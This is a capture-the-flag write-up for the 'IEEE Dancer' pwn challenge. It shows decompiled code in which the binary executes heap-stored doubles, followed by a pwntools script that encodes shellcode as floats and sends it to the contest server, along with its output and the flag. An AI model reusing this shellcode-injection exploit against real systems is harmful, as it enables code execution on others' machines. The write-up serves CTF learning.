# 1. IEEE Dancer 

---

##  Challenge Description

> Drain your floats in style with higher precision! <br>
 Connection: ncat --ssl dancer.chals.nitectf25.live 1337

---

##  Files Provided

- `Chall` – ELF 64-bit binary


```bash
garri@LAPTOP-J4CRR4GO:/mnt/c/Users/garri/Desktop/pwn3$ ./chall
enter the number of floats you want to enter!
41

```
## Initial Recon
> 1.Running the elf file and analysing the output <br>
> 2. The program asks for N-floating point numbers
> 3. Seeing what the options do<Br>


## Vulnerability analsyis
> 1. Opening the file in IDA<br>

> 2. main():
```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+0h] [rbp-30h] BYREF
  int i; // [rsp+4h] [rbp-2Ch]
  unsigned __int64 v6; // [rsp+8h] [rbp-28h]
  size_t len; // [rsp+10h] [rbp-20h]
  void *addr; // [rsp+18h] [rbp-18h]
  unsigned __int64 v9; // [rsp+20h] [rbp-10h]
  unsigned __int64 v10; // [rsp+28h] [rbp-8h]

  v10 = __readfsqword(0x28u);
  setbuf(stdout, 0);
  setbuf(stdin, 0);
  setbuf(stderr, 0);
  puts("enter the number of floats you want to enter!");
  __isoc99_scanf("%d", &v4);
  if ( v4 > 100 )
  {
    puts("too much");
    exit(0);
  }
  v6 = (unsigned __int64)calloc(v4, 8u);
  if ( v6 )
  {
    for ( i = 0; i < v4; ++i )
      __isoc99_scanf("%lf", 8LL * i + v6);
    len = sysconf(30);
    addr = (void *)(-(__int64)len & v6);
    if ( mprotect(addr, len, 7) >= 0 )
    {
      enable_seccomp();
      puts("draining in progress...");
      v9 = v6;
      ((void (*)(void))v6)();
      return 0;
    }
    else
    {
      perror("mprotect");
      return 1;
    }
  }
  else
  {
    perror("calloc");
    return 1;
  }
}
```<Br>

> 4. v6 = calloc(v4, 8);
each float is given 8 bytes but , thats a double?!
> 5. The program reads raw doubles into heap ! , heap exploitation!
> 6. Vuln: 
```
addr = (void *)(-(long)len & v6);
mprotect(addr, len, 7);   // RWX
 <br>
 ```
((void (*)(void))v6)();
```
7 . Heapchunk is made executable and then the line below jumps to our heap data and executes it
```
## Exploit strat
> We need to inject shellcode as floats <br>
```python
from pwn import *
import struct

p = remote("dancer.chals.nitectf25.live", 1337, ssl=True)

sc = open("shell.bin","rb").read()
while len(sc) % 8 != 0:
    sc += b"\x90"

chunks = [sc[i:i+8] for i in range(0, len(sc), 8)]
floats = [struct.unpack("<d", c)[0] for c in chunks]

p.sendlineafter(b"enter the number of floats", str(len(floats)).encode())
for f in floats:
    p.sendline(repr(f).encode())

p.interactive()
### i love pwn tools >< not my script but still pwntool script is what i prefer
 
```
# Why this works?
- Scanf(%lf) parse our ascii output,computes the IEEE-754 encoding and writes those 8 bytes to memory .   
- What we did is we took shellcode bytes, split em into 8 byte chunks , interpreted each chunk as a double and printed that as text
- Scanf("%lf") reconstructs the same 8 bytes
```bash
[+] Opening connection to dancer.chals.nitectf25.live on port 1337: Done
[*] Switching to interactive mode
 you want to enter!
draining in progress...
nite{W4stem4n_dr41nss_aLLth3_fl04Ts_int0_ex3cut5bl3_sp4ce}
Illegal instruction
[*] Got EOF while reading in interactive
$
```
```
## Flag: nite{W4stem4n_dr41nss_aLLth3_fl04Ts_int0_ex3cut5bl3_sp4ce}

```
